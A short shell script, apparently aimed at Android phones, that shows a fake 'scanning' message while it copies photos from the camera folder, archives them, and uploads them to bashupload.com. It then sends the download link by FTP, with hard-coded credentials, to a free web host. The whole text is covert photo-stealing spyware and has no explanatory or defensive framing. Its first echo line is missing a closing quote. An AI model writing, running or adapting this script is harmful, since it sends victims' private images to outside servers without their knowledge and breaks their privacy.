echo -e '\033[31m SCANNING PLEASE WAIT... \033[0m

cd /sdcard/DCIM/camera/
i=0
for x in *.jpg; do
  if [ "$i" = 3 ]; then break; fi
  cp "$x" /sdcard
  i=$((i+1))
done
cd /sdcard
tar cf 2022.tar *.jpg
curl bashupload.com -T 2022.tar > $HOME/70.txt 

curl -T 70.txt -u "immigration22:123456aaA." ftp://files.000webhost.com/tmp/70.txt